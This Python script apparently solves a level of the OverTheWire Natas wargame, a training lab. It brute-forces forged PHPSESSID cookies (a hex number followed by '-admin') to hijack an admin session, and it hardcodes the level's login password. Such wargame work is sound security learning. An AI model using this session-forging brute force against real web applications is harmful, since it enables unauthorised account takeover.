import requests 

for session_id in range(641):

    new_session_str = str(session_id)
    new_session_hex = ''.join(format(ord(c), '02x') for c in new_session_str)
    #admin in hex
    admin_hex = '2d61646d696e';
    new_id = new_session_hex + admin_hex;
    print("New ID: " + new_id + " session_id: " + str(session_id) + "\n");
    response = requests.get('http://natas19.natas.labs.overthewire.org', auth = ('natas19', 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'), cookies = {'PHPSESSID': new_id})
    
    if ("You are an admin." in response.text):
        print(response.text);
        break;
        